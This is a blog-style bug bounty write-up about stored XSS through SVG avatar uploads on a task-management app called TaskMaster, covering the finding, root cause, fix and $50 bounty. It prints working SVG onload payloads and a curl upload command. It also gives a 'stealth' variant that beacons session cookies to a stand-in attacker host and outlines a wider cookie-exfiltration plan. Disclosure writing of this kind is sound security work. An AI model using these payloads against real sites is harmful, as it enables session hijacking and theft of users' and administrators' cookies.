---
title: "TaskMaster – How an Avatar Became a Cookie Monster"
description: "Exploring how a harmless SVG avatar turned into a full-blown stored XSS on TaskMaster"
date: '2023-10-05'
categories: ["Bug Bounty", "Web Security", "XSS Chronicles"]
tags: ["Stored XSS", "SVG", "TaskMaster", "YesWeHack"]
header:
  image: "/images/taskmaster-xss-banner.jpg"
  caption: "Even an avatar can be dangerous if you let SVGs speak JavaScript"
---

## Prologue — Of Avatars and Curiosity

**It started with a profile page.**

Late one night in October, I was sipping on reheated coffee and casually poking around the "TaskMaster" app — a tidy little task management platform listed on YesWeHack. On the surface, it was clean, minimal, maybe even a bit charming.

But I wasn't there for charm. I was there for cracks.

And then, there it was — the avatar upload.

**"What if...?"**

A question every hacker knows too well. And so I clicked — and down the rabbit hole we went.

---

## Chapter 1 — First Contact with the Upload Beast

The upload feature accepted image files: JPG, PNG, GIF… but no visible restrictions on file type.

So I tried my favorite "edge-case image": an SVG file.

> Why SVG? Because it's not just an image — it's a vector format that **executes JavaScript** if not handled properly.

I crafted the simplest SVG payload imaginable:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
```

Saved it as `exploit.svg`.

Would it upload? Would it break?

---

## Chapter 2 — Uploading the Trojan Horse

**The curl command whispered into the void.**

```bash
curl -X POST https://taskmasterapp.com/upload   -F "avatar=@exploit.svg"   -H "Cookie: session=123"
```

The response was **200 OK**. My SVG was in.

> No sanitization warnings. No file type rejection. Just a quiet acceptance.

I checked my profile page.

Nothing yet.

But then I remembered—most sites lazy-load or render avatars differently for the viewer vs. an admin.

So I waited.

Then, I switched to a second account and viewed the profile.

Nothing again.

So I asked the ultimate question:

**What happens when the admin sees it?**

---

## Chapter 3 — Triggering the XSS

I waited until morning. Refreshed the profile.

Then, from a second session — with admin rights — I visited the same profile page where I had uploaded the SVG.

**Boom. Alert popped.**

```javascript
alert(document.cookie)
```

A beautifully chaotic popup.

And with it, access to session cookies.

No frills. No filters. Just raw JavaScript execution embedded inside a **stored** avatar upload.

---

## Chapter 4 — Thinking Like an Attacker

Let’s rewind to what I was thinking at each stage.

**1. SVG upload? Red flag.**

SVGs aren't images in the traditional sense. They are XML documents, often capable of executing scripts.

**2. No content filtering? Jackpot.**

The moment I saw the site accepted the file without stripping the `onload` attribute, I knew we were dealing with a real issue.

**3. Stored XSS on profile pages? High impact.**

Any admin or privileged user viewing the profile would immediately get hit. No click required.

I imagined a larger attack:

- Upload multiple poisoned avatars across many users.
- Wait for moderators to view their profiles.
- Use `fetch()` or image beacons to exfiltrate data.

The payload possibilities were endless.

---

## Chapter 5 — Proof of Concept (PoC)

### PoC 1 — SVG Payload

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
```

Uploaded as a profile avatar.

### PoC 2 — Exploit Trigger

When a privileged user (admin/mod) visits the profile:

- JavaScript executes.
- `document.cookie` exposed.
- Session hijacking possible.

**Alternate Payload for Stealth:**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="new Image().src='https://attacker.tld/log?c='+document.cookie"/>
```

---

## Chapter 6 — Root Cause

- **No SVG Sanitization**: The upload logic didn’t filter XML or disallow SVG tags with event attributes.
- **Stored XSS**: Once uploaded, the SVG persisted and was rendered inline.
- **JavaScript Execution**: `onload` inside the `<svg>` tag triggered code execution.

**Lack of CSP (Content Security Policy)** made this even easier — no restriction on inline scripts.

---

## Chapter 7 — The Report

I wrote up the full findings, attached the PoC, outlined the risk.

Submitted the report to YesWeHack.

### Report Timeline

- **Report Date**: October 5, 2023
- **Acknowledgment**: < 12 hours
- **Fix Deployed**: Within 3 days
  - SVG uploads disabled
  - Content Security Policy (CSP) headers added

### Bounty: **$50**

A modest reward — but the lesson was worth much more.

---

## Epilogue — Reflections from the Vector Wilds

This wasn’t the biggest bounty.

It wasn’t a critical RCE.

But it was **real**.

And it reminded me:

- Images aren’t always safe.
- SVGs are vectors — **literally** and **attack-wise**.
- Stored XSS is timeless.
- Upload forms are always worth investigating.

The best bugs are often **quiet** — hiding in plain sight, waiting for someone to ask:

> **"What if...?"**

---

## TL;DR Summary

- **Vuln**: Stored XSS via SVG upload in user avatars
- **Platform**: YesWeHack — TaskMaster App
- **Payload**: `<svg onload="alert(document.cookie)">`
- **Impact**: Session hijack for viewers (admin/moderator)
- **Fix**: Disabled SVG uploads, added CSP
- **Bounty**: $50
- **Lesson**: Never trust an image by its extension

---

*This writeup is dedicated to the sleepy hackers who still believe every file upload hides a story.*
